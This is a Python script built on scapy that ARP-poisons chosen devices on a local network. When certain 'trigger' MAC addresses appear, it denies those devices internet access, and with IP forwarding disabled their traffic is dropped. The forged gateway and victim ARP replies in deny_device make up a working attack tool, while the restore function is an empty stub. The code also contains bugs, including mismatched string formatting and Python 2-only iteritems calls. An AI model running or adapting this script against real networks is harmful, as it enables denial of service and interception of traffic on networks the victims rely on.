"""
net_deny.py
This script denies internet access to a list of hosts (DENY_MACS) when a host from a specified list hosts (TRIGGER_MACS)
join the network. Make sure IP_Forwarding is disable on your machine or it wont deny traffic to the internet.

TODO
implement the restore_device function
create a monitor thread that monitors devices re-arping and poisons them again.
loop the contents of the function main so that it runs constantly. Maybe make the scan_network function only run once
every 5 minutes...
"""

from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.l2 import ARP

# CONFIG VARIABLES
NETWORK_ADDRESS = ""  # THE ADDRESS OF THE NETWORK; 192.168.1.0/24
NETWORK_INTERFACE = ""  # THE NETWORK INTERFACE; en0

GATEWAY_IP = ""  # THE IP OF THE GATEWAY
GATEWAY_MAC = ""  # THE MAC ADDRESS OF THE GATEWAY

TRIGGER_MACS = [""]  # MAC ADDRESSES THAT IF FOUND ON THE NETWORK TRIGGER THE ATTACK
DENY_MACS = [""]  # THE MAC ADDRESSES TO DENY INTERNET ACCESS TO

# Global Variables
CURRENTLY_DENYING = {}
TRIGGER_HOSTS_ONLINE = {}


def restore_device(ip_address, mac_address):
    pass


def deny_device(ip_address, mac_address):
    print("[*] DENYING %s".format(mac_address))
    global CURRENTLY_DENYING, GATEWAY_IP, GATEWAY_MAC
    send(ARP(op=2, psrc=GATEWAY_IP, pdst=ip_address, hwdst=mac_address))
    send(ARP(op=2, psrc=ip_address, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC))
    CURRENTLY_DENYING[mac_address] = ip_address


def scan_network():
    """
    Scan the network and return devices ip address and mac addresses.
    :return:
    """
    global NETWORK_ADDRESS
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=NETWORK_ADDRESS), timeout=2, retry=10)
    hosts = {}
    for snd ,rcv in responses:
        hosts[rcv[Ether].src] = rcv[ARP].psrc
    return hosts


def main():
    global CURRENTLY_DENYING, TRIGGER_HOSTS_ONLINE, NETWORK_INTERFACE, TRIGGER_MACS, DENY_MACS
    conf.iface = NETWORK_INTERFACE
    conf.verb = 0
    try:
        # Overwrite this for each scan so that if a trigger device goes offline devices can be restored
        TRIGGER_HOSTS_ONLINE = {}

        network_hosts = scan_network()

        print(network_hosts)

        print(TRIGGER_MACS)

        # iterate over the hosts to find trigger devices on the network
        for mac, ip in network_hosts.iteritems():
            print(mac)
            if mac in TRIGGER_MACS:
                print("[*] FOUND TRIGGER HOST %s".format(mac))
                TRIGGER_HOSTS_ONLINE[mac] = ip

        # only deny devices if there is at least 1 trigger host on the network
        if len(TRIGGER_HOSTS_ONLINE) > 0:
            # iterate over the hosts to find devices to deny on the network
            for mac, ip in network_hosts.iteritems():
                if mac in DENY_MACS and not CURRENTLY_DENYING.get(mac):
                    deny_device(ip_address=ip, mac_address=mac)
        else:  # if there are no trigger hosts on the network then restore connectivity to the client
            for mac, ip in CURRENTLY_DENYING.iteritems():
                restore_device(ip_address=ip, mac_address=mac)

    except KeyboardInterrupt:
        print("[*] RESTORING ALL DEVICES")
        for mac, ip in CURRENTLY_DENYING.iteritems():
            restore_device(ip_address=ip, mac_address=mac)
        print("[*] SHUTTING DOWN")


if __name__ == '__main__':
    main()
